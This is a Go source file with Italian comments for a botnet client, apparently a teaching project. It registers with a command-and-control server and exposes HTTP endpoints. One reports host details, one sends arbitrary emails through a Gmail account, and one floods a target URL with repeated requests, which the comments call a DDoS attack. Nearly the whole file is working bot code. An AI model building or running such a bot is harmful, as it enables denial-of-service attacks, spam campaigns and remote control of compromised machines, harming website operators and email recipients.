package main

import (
	"encoding/json"
	"fmt"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/disk"
	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
	"gopkg.in/gomail.v2"
	"net"
	"net/http"
	"strconv"
	"time"
)

// SysInfo è la struct contenente le informazioni di sistema dell'host
type SysInfo struct {
	Hostname string `bson:hostname`
	Platform string `bson:platform`
	CPU      string `bson:cpu`
	RAM      uint64 `bson:ram`
	Disk     uint64 `bson:disk`
}

// Site è la struct che riceviamo dalla C&C con tutte le info necessarie per iniziare l'attacco DDoS
type Site struct {
	Url   string `json:"url"`
	Times int    `json:"times"`
	Port  int    `json:"port"`
}

// Email è la struct che riceviamo dalla C&C con tutte le info necessarie per effetuare poi l'invio delle mail
type Email struct {
	Subject    string   `json:"subject"`
	Recipients []string `json:"recipients"`
	Body       string   `json:"body"`
}

// Actions è la struct che inviamo alla C&C con lo stato delle operazioni in corso
type Actions struct {
	Email         bool     `json:"email"`
	EmailError    []string `json:"emailError"`
	Requests      bool     `json:"requests"`
	SiteTargeted  string   `json:"RequestsLeft"`
	RequestsError []string `json:"requestsError"`
	Info          bool     `json:"info"`
	InfoError     []string `json:"infoError"`
}

// Semaphore ** Semaphore implementation from https://levelup.gitconnected.com/go-concurrency-pattern-semaphore-9587d45f058d **//
type Semaphore interface {
	Acquire()
	Release()
}

type semaphore struct {
	semC chan struct{}
}

func New(maxConcurrency int) Semaphore {
	return &semaphore{
		semC: make(chan struct{}, maxConcurrency),
	}
}
func (s *semaphore) Acquire() {
	s.semC <- struct{}{}
}
func (s *semaphore) Release() {
	<-s.semC
}

var sem Semaphore

//***********//

// Variabile globale sulla quale salviamo lo stato delle operazioni
var status Actions

// Variabile globale settata a true quando è in corso un attacco DDoS
var GO bool

// Variabile globale che contiene il numero delle mail ancora da spedire prima di poter dire di aver finito la loro elaborazione
var mailqueue int

func main() {
	//Istanziamo il semaforo necessario per garantire la mutua esclusione nei casi di processi concorrenti
	//In questo caso, è utilizzato sopratutto per gestire l'accesso alla variabile status
	sem = New(1)

	//Impostiamo gli handler per i vari entrypoint necessari per eseguire le operazioni
	http.HandleFunc("/email", emailHandler)
	http.HandleFunc("/site", siteHandler)
	http.HandleFunc("/system", getSystemInfo)
	http.HandleFunc("/status", getStatus)

	//Infine avviamo il bot
	startUpServer()
}

// Funzione necessaria per ricere l'IP dell'host
// Nota: Per semplicità didattica, il programma tenta di ricevere l'IP "locale" della macchina, ma in casi reali questo
// non sarebbe un approccio corretto perchè la macchina, se nattata, sarebbe irraggiungibile.
// Inoltre, nella maggior parte dei casi, una connessione del genere verrebbe bloccata dal firewall della rete.
func GetOutboundIP() net.IP {
	conn, err := net.Dial("udp", "1.1.1.1:80")
	if err != nil {
		panic(err.Error())
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP
}

// Funzione necessaria per effettuare il collegamento e la registrazione alla C&C
func startUpServer() {
	//La porta di default che tentiamo di bindare è la porta 80
	port := 80
	var err error
	var listener net.Listener
	//...se non riusciamo, cicliamo fino a quando non troviamo una porta libera, aumentando ogni volta di 1 il numero di porta
	for {
		listener, err = net.Listen("tcp", ":"+strconv.Itoa(port))
		if err == nil {
			break
		}
		port++
	}
	fmt.Printf("Available port: %d\n", port)
	var conn net.Conn
	//Infine tentiamo la connessione alla C&C
	conn, err = net.Dial("tcp", "192.168.178.64:8080")
	for err != nil {
		conn, err = net.Dial("tcp", "192.168.178.64:8080")
		//Nel caso non sia connessa, cicliamo fino a quando essa non torna online
		fmt.Println("Waiting for C&C to go back online")
		time.Sleep(3 * time.Second)
	}
	defer conn.Close()
	println(GetOutboundIP().String())
	//Appena effettuata la connessione, effettuiamo la registrazione condividendo i nostri dati...
	data := []byte(GetOutboundIP().String() + ":" + strconv.Itoa(port))
	if _, err := conn.Write(data); err != nil {
		panic(err)
	}
	fmt.Println("Registered to the C&C")
	//...e poi avviamo il server HTTP vero e proprio
	http.Serve(listener, nil)
}

// Funzione che invia il contenuto della variabile status alla C&C
func getStatus(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(status); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
}

// Funzione che fetcha e invia le informazioni relative all'host
func getSystemInfo(w http.ResponseWriter, r *http.Request) {

	sem.Acquire()
	status.InfoError = []string{}
	status.Info = true
	sem.Release()

	hostStat, err := host.Info()
	if err != nil {
		status.InfoError = append(status.InfoError, err.Error())
	}
	cpuStat, err := cpu.Info()
	if err != nil {
		status.InfoError = append(status.InfoError, err.Error())
	}
	vmStat, err := mem.VirtualMemory()
	if err != nil {
		status.InfoError = append(status.InfoError, err.Error())
	}
	diskStat, err := disk.Usage("/")
	if err != nil {
		status.InfoError = append(status.InfoError, err.Error())
	}

	info := new(SysInfo)

	info.Hostname = hostStat.Hostname
	info.Platform = hostStat.Platform
	info.CPU = cpuStat[0].ModelName
	info.RAM = vmStat.Total / 1024 / 1024
	info.Disk = diskStat.Total / 1024 / 1024

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(info); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}

	sem.Acquire()
	status.Info = false
	sem.Release()
}

// Funzione che prepara l'invio di una mail e poi crea un thread apposito per l'invio vero e proprio
func emailHandler(w http.ResponseWriter, r *http.Request) {
	sem.Acquire()
	mailqueue++
	if !status.Email {
		status.EmailError = []string{}
	}
	status.Email = true
	sem.Release()

	var e Email
	if err := json.NewDecoder(r.Body).Decode(&e); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		sem.Acquire()
		mailqueue--
		if mailqueue == 0 {
			status.Email = false
		}
		sem.Release()
		return
	} else {
		w.WriteHeader(http.StatusOK)
	}

	go sendEmail(e)
}

// Funzione che effettua l'invio di una mail impostandola e utilizzando la libreria goMail per spedirla
func sendEmail(e Email) {
	m := gomail.NewMessage()
	m.SetHeader("From", "***@gmail.com")
	m.SetHeader("To", e.Recipients...)
	m.SetHeader("Subject", e.Subject)
	m.SetBody("text/html", e.Body)

	d := gomail.NewDialer("smtp.gmail.com", 587, "***@gmail.com", "***")

	if err := d.DialAndSend(m); err != nil {
		status.EmailError = append(status.EmailError, err.Error())
	} else {
		println("Email sent correctly")
	}
	sem.Acquire()
	mailqueue--
	if mailqueue == 0 {
		status.Email = false
	}
	sem.Release()
}

func siteHandler(w http.ResponseWriter, r *http.Request) {

	if r.Method == "DELETE" {
		stopRequests()
		return
	}

	var s Site
	if err := json.NewDecoder(r.Body).Decode(&s); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	sem.Acquire()
	if status.Requests {
		http.Error(w, "Unavailable", http.StatusServiceUnavailable)
		sem.Release()
		return
	}
	status.Requests = true
	status.SiteTargeted = s.Url
	status.RequestsError = []string{}
	sem.Release()

	GO = true
	go startHttpRequests(s.Times, s.Url+":"+strconv.Itoa(s.Port))
}

func startHttpRequests(i int, requestURL string) {

	for GO {
		if i == 0 {
			GO = false
			break
		} else if i > 0 {
			i--
		}
		println(requestURL)
		response, err := http.Get(requestURL)
		if err != nil {
			status.RequestsError = append(status.RequestsError, err.Error())
			GO = false
		} else {
			println(response.StatusCode)
		}
	}
	sem.Acquire()
	status.SiteTargeted = ""
	status.Requests = false
	sem.Release()
}

func stopRequests() {
	GO = false
}
